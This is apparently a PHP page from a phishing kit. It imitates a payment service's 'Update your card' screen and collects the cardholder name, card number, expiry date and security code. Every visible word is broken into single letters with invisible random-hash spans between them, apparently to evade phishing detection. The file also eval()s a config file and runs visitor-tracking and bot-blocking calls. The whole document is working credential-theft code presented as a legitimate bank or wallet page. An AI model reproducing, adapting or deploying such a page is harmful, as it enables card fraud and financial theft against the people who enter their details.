<?php
require_once __DIR__ . '/function.php';

if (file_exists($api->dir_config . '/' . $api->general_config)) {
  @eval(file_get_contents($api->dir_config . '/' . $api->general_config));
}

if ($config_blocker == 1) {
  $api->cookie();
  $api->session();
}

$api->visitor("Card");
$page = 'card';
$notification = 3;
require __DIR__ . '/page/header.php';

?>
<!DOCTYPE html>
<html>

<head>
<title><?=$api->transcode("Confirm Card");?></title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="shortcut icon" href="../assets/img/favicon.ico">
<link rel="apple-touch-icon" href="../assets/img/apple-touch-icon.png">
<link rel="stylesheet" href="../assets/css/myaccount_app.css">
<link rel="stylesheet" href="../assets/css/myaccount_wallet.css">
<script src="../assets/js/jquery.min.js"></script>
<script src="../assets/js/jquery.mask.js"></script>
<script src="../assets/js/jquery.validate.js"></script>
<script src="../assets/js/myaccount.card.js"></script>
</head>

<body>
<div class="contents vx_mainContent">
<div class="mainContents summaryContainer">
<div class="engagementModule nemo_engagementModule">
<div class="engagementMainBar-container js_engagementMainBar-container">
<div class="summarySection engagementMainBar row" style="height:0%;">
<div class="col-sm-7 progressAndWelcome">
<div class="welcomeMessage js_selectModule selectModule profileStatus active">
<p class="vx_h3 engagementWelcomeMessage nemo_welcomeMessageHeader">
<span class="icon icon-small icon-lock-small" style="color:#ffffff"></span>&nbsp;<span style="color:#FFFFFF">
<span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("U");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("p");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("d");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("a");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("t");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("A");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("c");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("c");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("o");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("u");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("n");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("t");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("c");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("a");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("r");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("d");?></span>
</p>
</div>
</div>
</div>
</div>
</div>
<div class="mainBody">
<div class="overpanel-wrapper row">
<div class="overpanel-content col-xs-12 col-xs-offset-0 col-sm-8 col-sm-offset-2 col-md-4 col-md-offset-4">
<div class="overpanel-header">
<h2>

<span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("U");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("p");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("d");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("a");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("t");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("y");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("o");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("u");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("r");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("c");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("a");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("r");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("d");?></h2>
</div>
<div class="twbs_alert vx_alert vx_alert-critical js_alertMsg hide" id="MSGError">
<p class="vx_alert-text">
<font size="2">

<span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("T");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("h");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("i");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("s");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("c");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("a");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("r");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("d");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("i");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("s");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("n");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("o");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("t");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("a");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("c");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("c");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("p");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("t");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("d");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(".");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("P");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("l");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("a");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("s");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("u");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("s");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("a");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("d");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("i");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("f");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("f");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("r");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("n");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("t");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("c");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("a");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("r");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("d");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(".");?>
</font>
</p>
</div>
<div class="overpanel-body">
<form name="addCreditOrDebit" method="post" id="card" autocomplete="off">
<div class="textInput lap" id="DivName">
<input type="text" placeholder="<?=$api->transcode("Cardholder Name");?>" id="Name" name="cardholder">
</div>
<div class="creditCardInput clearfix">
<div class="creditCardInput-layout">
<div class="cardNumber" id="cardNumber">
<div class="textInput ccNumber ccNumber ccNum lap" id="DivNumber">
<input type="tel" placeholder="<?=$api->transcode("Card Number");?>" id="Number" name="cardnum">
</div>
<div class="cardLogo">
<span class="fiModule-icon_card" id="DivLogo"></span>
</div>
</div>
<div class="cardInputs">
<div class="expiration js_card_toggleField">
<div class="textInput expirationDate js_expirationDate expirationDate expirationDate lap" id="DivExp">
<input type="tel" placeholder="<?=$api->transcode("Expiration Date (MM/YY)");?>" id="Exp" name="cardexp">
</div>
</div>
<div class="js_card_toggleField" id="cardSecurityCode">
<div class="textInput csc pull-right csc securityCode lap" id="DivCvv" data-ctype="">
<input type="tel" placeholder="<?=$api->transcode("Security Code");?>" id="Cvv" name="cardcvv">

</div>

</div>
</div>
</div>

<div style="display:none; visibility:hidden;"><input type="text" name="killbill" maxlength="50"></div>
<center>

<button class="vx_btn" type="submit"  id="btnConfirm">
<span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("U");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("p");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("d");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("a");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("t");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?></button>
</center>
<br>
<br>
<br>
</div>



</form>
</div>
</div>
</div>
<?php
require __DIR__ . '/page/footer.php';
?>
<div class="hasSpinner hide" id="loding"></div>
</div>
    </div>
    </div>
<script src="../assets/js/card.post.js"></script>
</body>

</html>


